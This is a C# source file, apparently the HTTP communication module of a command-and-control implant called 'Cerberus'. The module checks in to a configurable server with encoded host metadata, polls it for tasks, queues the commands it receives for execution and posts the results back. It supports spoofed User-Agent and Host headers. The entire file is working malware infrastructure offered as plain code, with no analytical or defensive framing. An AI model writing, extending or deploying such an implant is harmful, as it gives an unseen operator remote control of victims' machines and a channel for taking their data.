using Cerberus.Models.Tasks;
using System;
using System.Linq;
using System.Net.Http;
using System.Text;

using System.Threading;
using System.Threading.Tasks;

namespace Cerberus.Models.CommModule
{
    public class HttpCommModule : CommModule
    {
        public string ServerAddress { get; set; }
        public int ServerPort { get; set; }
        public string PayloadUUID { get; set; }
        public string URI { get; set; } = "/data";
        public string UserAgent { get; set; }
        public string HostHeader { get; set; }
        public int SleepTime { get; set; }
        public string CallbackUUID { get; set; }
        public bool Exit { get; set; } = false;
        public CerberusMetadata Metadata { get; set; }

        private CancellationTokenSource _cancellationTokenSource;
        private HttpClient _httpClient;

        public HttpCommModule(string connectAddress, int connectPort, int sleepTime, CerberusMetadata metadata, string uuid)
        {
            ServerAddress = connectAddress;
            ServerPort = connectPort;
            SleepTime = sleepTime;
            Metadata = metadata;
            PayloadUUID = uuid;
        }

 /*       public HttpCommModule(string serverAddress, int serverPort, int sleepTime, CerberusMetadata metadata)
        {
            ServerAddress = serverAddress;
            ServerPort = serverPort;
            SleepTime = sleepTime;
            Metadata = metadata;
        }*/

        public override void Init(CerberusMetadata metadata)
        {
            base.Init(metadata);

            _httpClient = new HttpClient();
            _httpClient.BaseAddress = new Uri($"http://{ServerAddress}:{ServerPort}");
            _httpClient.DefaultRequestHeaders.Clear();

            //var encodedMetadata = Convert.ToBase64String(Metadata.Serialize());

            // assume a user agent is present. There will be a default set in build params
            if(!string.IsNullOrEmpty(UserAgent))
            {
                _httpClient.DefaultRequestHeaders.Add("User-Agent", UserAgent);
            }
            
            if(!string.IsNullOrWhiteSpace(HostHeader))
            {
                _httpClient.DefaultRequestHeaders.Add("Host", HostHeader);
            }
        }

        public override async Task Start()
        {
            _cancellationTokenSource= new CancellationTokenSource();

            await InitCheckin();

            while (!_cancellationTokenSource.IsCancellationRequested)
            {
                // do we have data to send?
                if (!Outbound.IsEmpty)
                {
                    await SendTaskingResponse();
                }
                else
                {
                    await GetTasking();
                }
                // Sleep
                await Task.Delay(SleepTime);
            }
            
            Environment.Exit(0);
        }

        public override async Task InitCheckin()
        {
            var encodedMetadata = Convert.ToBase64String(Metadata.Serialize());
            var encodedUUID = Convert.ToBase64String(Encoding.UTF8.GetBytes(PayloadUUID));
            var content = new StringContent((encodedUUID + encodedMetadata), Encoding.UTF8, "application/json");
            var response = await _httpClient.PostAsync(URI, content);
            var responseContent = await response.Content.ReadAsStringAsync();

            HandleCallback(responseContent);
        }

        private void HandleCallback(string response)
        {
            var decodedResponse = Encoding.UTF8.GetString(Convert.FromBase64String(response));
            var json = decodedResponse.Substring(36);

            var callback = Encoding.UTF8.GetBytes(json).Deserialize<CallbackMessage>();

            if (callback.status.Equals("success"))
            {
                Metadata.uuid = callback.id;
                CallbackUUID = callback.id;
            }
        }

        private async Task GetTasking()
        {
            var getTasking = new GetTaskingRequest
            {
                action = "get_tasking",
                tasking_size = -1,
            };
            var encodedGetTasking = Convert.ToBase64String(getTasking.Serialize());
            var content = new StringContent(Convert.ToBase64String(Encoding.UTF8.GetBytes(CallbackUUID)) + encodedGetTasking);
            var response = await _httpClient.PostAsync(URI,  content);
            var responseContent = await response.Content.ReadAsStringAsync();
            HandleTaskingResponse(responseContent);
        }

        private async Task SendTaskingResponse()
        {
            var outbound = GetOutbound();
            var taskingResponse = new PostTaskingRequest
            {
                action = "post_response",
                responses = outbound.ToArray()
            };
            var json = taskingResponse.Serialize();
            var encodedJson = Convert.ToBase64String(json);

            var content = new StringContent(Convert.ToBase64String(Encoding.UTF8.GetBytes(CallbackUUID)) + encodedJson);
            var response = await _httpClient.PostAsync(URI, content);
            var responseContent = await response.Content.ReadAsStringAsync();

            HandlePostResponse(responseContent);

            if (Exit)
            {
                Stop();
            }
        }

        private void HandleTaskingResponse(string response)
        {
            var decodedResponse = Encoding.UTF8.GetString(Convert.FromBase64String(response));
            var json = decodedResponse.Substring(36);
            var taskingResponse = Encoding.UTF8.GetBytes(json).Deserialize<GetTaskingResponse>();
            var tasks = taskingResponse.tasks;

            if (tasks != null && tasks.Any())
            {
                foreach (var task in tasks)
                {
                    Inbound.Enqueue(task);

                    if (task.command.Equals("exit"))
                    {
                        Exit = true;
                    }
                }
            }
        }

        private void HandlePostResponse(string response)
        {
            var decodedResponse = Encoding.UTF8.GetString(Convert.FromBase64String(response));
            var json = decodedResponse.Substring(36);

            // process response
            var message = Encoding.UTF8.GetBytes(json).Deserialize<PostTaskingRequest>();
            foreach(var status in message.responses)
            {
                // do something with status
            }

        }

        public override void Stop()
        {
            _cancellationTokenSource.Cancel();
        }
    }
}
